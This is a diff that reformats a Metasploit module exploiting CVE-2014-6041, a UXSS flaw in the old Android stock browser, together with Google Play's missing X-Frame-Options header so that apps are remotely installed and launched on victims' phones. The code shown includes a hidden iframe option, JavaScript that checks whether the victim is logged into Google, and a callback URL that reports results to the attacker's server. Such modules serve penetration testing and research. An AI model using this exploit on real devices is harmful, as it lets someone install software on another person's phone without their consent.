@@ -1,48 +1,53 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpServer::HTML
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Android Browser RCE Through Google Play Store XFO',
-      'Description'    => %q{
-        This module combines two vulnerabilities to achieve remote code
-        execution on affected Android devices. First, the module exploits
-        CVE-2014-6041, a Universal Cross-Site Scripting (UXSS) vulnerability present in
-        versions of Android's open source stock browser (the AOSP Browser) prior to
-        4.4. Second, the Google Play store's web interface fails to enforce a
-        X-Frame-Options: DENY header (XFO) on some error pages, and therefore, can be
-        targeted for script injection. As a result, this leads to remote code execution
-        through Google Play's remote installation feature, as any application available
-        on the Google Play store can be installed and launched on the user's device.
+    super(
+      update_info(
+        info,
+        'Name' => 'Android Browser RCE Through Google Play Store XFO',
+        'Description' => %q{
+          This module combines two vulnerabilities to achieve remote code
+          execution on affected Android devices. First, the module exploits
+          CVE-2014-6041, a Universal Cross-Site Scripting (UXSS) vulnerability present in
+          versions of Android's open source stock browser (the AOSP Browser) prior to
+          4.4. Second, the Google Play store's web interface fails to enforce a
+          X-Frame-Options: DENY header (XFO) on some error pages, and therefore, can be
+          targeted for script injection. As a result, this leads to remote code execution
+          through Google Play's remote installation feature, as any application available
+          on the Google Play store can be installed and launched on the user's device.
 
-        This module requires that the user is logged into Google with a vulnerable browser.
+          This module requires that the user is logged into Google with a vulnerable browser.
 
-        To list the activities in an APK, you can use `aapt dump badging /path/to/app.apk`.
-      },
-      'Author'         => [
-        'Rafay Baloch', # Original UXSS vulnerability
-        'joev'          # Play Store vector and Metasploit module
-      ],
-      'License'        => MSF_LICENSE,
-      'Actions'        => [[ 'WebServer' ]],
-      'PassiveActions' => [ 'WebServer' ],
-      'References' => [
-        [ 'URL', 'https://community.rapid7.com/community/metasploit/blog/2014/09/15/major-android-bug-is-a-privacy-disaster-cve-2014-6041'],
-        [ 'URL', 'http://1337day.com/exploit/description/22581' ],
-        [ 'OSVDB', '110664' ],
-        [ 'CVE', '2014-6041' ]
-      ],
-      'DefaultAction'  => 'WebServer'
-    ))
+          To list the activities in an APK, you can use `aapt dump badging /path/to/app.apk`.
+        },
+        'Author' => [
+          'Rafay Baloch', # Original UXSS vulnerability
+          'joev'          # Play Store vector and Metasploit module
+        ],
+        'License' => MSF_LICENSE,
+        'Actions' => [[ 'WebServer', { 'Description' => 'Serve exploit via web server' } ]],
+        'PassiveActions' => [ 'WebServer' ],
+        'References' => [
+          [ 'URL', 'http://web.archive.org/web/20230321034739/https://www.rapid7.com/blog/post/2014/09/15/major-android-bug-is-a-privacy-disaster-cve-2014-6041/'],
+          [ 'URL', 'https://web.archive.org/web/20150316151817/http://1337day.com/exploit/description/22581' ],
+          [ 'OSVDB', '110664' ],
+          [ 'CVE', '2014-6041' ]
+        ],
+        'DefaultAction' => 'WebServer',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK],
+          'Reliability' => []
+        }
+      )
+    )
 
     register_options([
       OptString.new('PACKAGE_NAME', [
@@ -56,12 +61,12 @@ class MetasploitModule < Msf::Auxiliary
         'com.swlkr.rickrolld/.RickRoll'
       ]),
       OptBool.new('DETECT_LOGIN', [
-        true, "Prevents the exploit from running if the user is not logged into Google", true
+        true, 'Prevents the exploit from running if the user is not logged into Google', true
       ]),
       OptBool.new('HIDE_IFRAME', [
-        true, "Hide the exploit iframe from the user", true
+        true, 'Hide the exploit iframe from the user', true
       ])
-    ], self.class)
+    ])
   end
 
   def on_request_uri(cli, request)
@@ -71,7 +76,7 @@ class MetasploitModule < Msf::Auxiliary
       print_error request.body[0..400]
       send_response_html(cli, '')
     else
-      print_status("Sending initial HTML ...")
+      print_status('Sending initial HTML ...')
       send_response_html(cli, exploit_html)
     end
   end
@@ -143,7 +148,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def detect_login_js
     if datastore['DETECT_LOGIN']
-      %Q|
+      %|
         var img = document.createElement('img');
         img.onload = exploit;
         img.onerror = function() {
@@ -153,7 +158,7 @@ class MetasploitModule < Msf::Auxiliary
           x.send('Exploit failed: user is not logged into google.com')
         };
         img.setAttribute('style', HIDDEN_STYLE);
-        var rand = '&d=#{Rex::Text.rand_text_alphanumeric(rand(12)+5)}';
+        var rand = '&d=#{Rex::Text.rand_text_alphanumeric(rand(5..16))}';
         img.setAttribute('src', 'https://accounts.google.com/CheckCookie?continue=https%3A%2F%2Fwww.google.com%2Fintl%2Fen%2Fimages%2Flogos%2Faccounts_logo.png'+rand);
         document.body.appendChild(img);
       |
@@ -171,7 +176,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def backend_url
-    proto = (datastore["SSL"] ? "https" : "http")
+    proto = (datastore['SSL'] ? 'https' : 'http')
     myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']
     port_str = (datastore['SRVPORT'].to_i == 80) ? '' : ":#{datastore['SRVPORT']}"
     "#{proto}://#{myhost}#{port_str}/#{datastore['URIPATH']}/catch"
@@ -180,5 +185,4 @@ class MetasploitModule < Msf::Auxiliary
   def run
     exploit
   end
-
 end
